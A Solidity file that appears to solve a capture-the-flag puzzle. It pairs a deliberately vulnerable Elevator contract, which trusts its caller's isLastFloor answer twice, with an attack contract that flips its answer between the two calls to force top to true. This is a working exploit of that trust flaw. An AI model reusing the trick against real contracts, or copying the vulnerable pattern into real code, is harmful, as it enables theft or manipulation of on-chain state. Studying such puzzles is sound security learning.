// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract VirtualOverride {
    bool public isLast = true;

    function virtualOverride(address _addr) public {
        Elevator elevator = Elevator(_addr);
        elevator.goTo(20);
    }

    // It will be ran 1st on if validation, so it goes from true to false
    // Runs second time to validate top and goes from false to true
    // floor uint is just a distraction
    function isLastFloor(uint) external returns (bool) {
        isLast = !isLast;
        return isLast;
    }
}